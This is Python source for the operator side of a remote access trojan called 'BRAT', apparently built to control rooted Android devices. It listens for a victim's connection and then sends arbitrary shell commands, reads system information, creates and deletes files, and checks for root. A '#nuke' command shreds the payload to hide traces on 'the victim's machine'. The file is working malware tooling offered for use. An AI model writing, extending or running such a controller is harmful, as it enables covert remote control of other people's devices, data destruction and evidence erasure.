import os
import sys
from time import sleep

host = sys.argv[1]
port = int(sys.argv[2])
output = sys.argv[3]

import socket
import sys
from time import asctime
from time import sleep

print(("[" + asctime() + "] Listening on port " + str(port)))
sleep(1)
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print("[" + asctime() + "] Waiting Connection From Client...")
    c, _ = s.accept()
    print(('[' + asctime() + '] Session Opened | ' + 'IP : ' + _[0] + ' | Port : ' + str(_[1])+'\n'))
    sleep(2)

except OSError as error:
    print('[i] ' + str(error))
    sys.exit()

def raw_converter(string):
    string = str(string)
    n = r'\n'
    t = r'\t'
    bs = r"b'"
    be = r"\n'"

    result = string.replace(bs, '')
    result = result.replace(be, r'\n')
    result = result.replace(n, '\n')
    result = result.replace(t, '\t')
    return result

def main(prog_name):
    and_pwd = ' && pwd\n'
    meminfo = 'cat /proc/meminfo'
    nuke_it = 'shred --force -n 35 -u -v -z ' + prog_name
    cpuinfo = 'cat /proc/cpuinfo'
    crypto = 'cat /proc/crypto'
    check_root = 'which su'
    check_partitions = 'cat /proc/partitions'
    whoami = 'whoami'

    and_pwd = and_pwd.encode()
    meminfo = meminfo.encode()
    nuke_it = nuke_it.encode()
    cpuinfo = cpuinfo.encode()
    crypto = crypto.encode()
    check_root = check_root.encode()
    check_partitions = check_partitions.encode()
    whoami = whoami.encode()

    print("[i] Type '#help' for information.")
    while True:
        hosttt = _[0]
        cmd = input('[' + asctime() + ' | BRAT@' + hosttt + ']: ')
        
        if cmd[0:5] == 'mkdir':
            cmd = cmd.encode()
            c.send(cmd+and_pwd)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)
        
        elif cmd == 'meminfo':
            c.send(meminfo)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)
        
        elif cmd == 'cpuinfo':
            c.send(cpuinfo)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)
        
        elif cmd == 'crypto':
            c.send(crypto)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)
        
        elif cmd == 'kernel_info':
            cmd = cmd.encode()
            c.send(cmd)
            ab = c.recv(100000)
            ab = raw_converter(ab)
            print(("\n[+] \033[37;1mKernel Version : "+str(ab)))
        
        elif cmd == 'check_root':
            c.send(check_root)
            a = c.recv(100000)
            if a == r'\n/system/bin/su\n':
                print("\n[*] This Device Is Rooted...\n")
            
            else:
                print("\n[*] This Device Not Rooted...\n")
            
        elif cmd == 'su':
            print("\n[*] Command 'SU' Not *Yet* Working...\n")
            continue
        
        elif cmd == 'check_partitions':
            c.send(check_partitions)
            print('')
            output = c.recv(1000000)
            output = raw_converter(output)
            print(output)
        
        elif cmd == '#help':
            print("""
#help            : Shows this help menu
kernel_info      : Check Kernel Version + Info
mkdir            : Create Directory On Target
meminfo          : Check Info Memory Target
cpuinfo          : Check Info CPU Target
rm               : Remove File On Target
rmdir            : Remove Folder On Target
whoami           : Check Name User Target
crypto           : Check Encoding On Target
check_partitions : Check Info Partisi On Target
#nuke            : Shred and delete the payload from the victim's machine
#logout          : Close the connection
""")

        elif cmd[0:2] == 'rm':
            cmd = cmd.encode()
            c.send(cmd+and_pwd)
            output = c.recv(100000)
            output = raw_converter(output)
        
        elif cmd[0:5] == 'rmdir':
            cmd = cmd.encode()
            c.send(cmd+and_pwd)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)
        
        elif cmd[0:6] == 'whoami':
            c.send(whoami)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#nuke':
            c.send(nuke_it)
            output = c.recv(100000)
            output = raw_converter(output)
            print(output)

        elif cmd == '#logout':
            #c.close()
            print("[" + asctime() + "] Connection closed by local host...")
            break
        
        elif cmd == '':
            continue
        
        else:
            cmd = cmd.encode()
            c.send(cmd)
            results = c.recv(100000)
            results = raw_converter(results)
            if results == 'bacod':
                continue

            print(results)

try:
    main(output)
except KeyboardInterrupt:
    print("[!] CTRL+C Detected. Shutdown Server...")
    sleep(2)
    sys.exit()

except socket.error:
    print("[!] Connection closed by foreign host...")
    sleep(2)
    sys.exit()
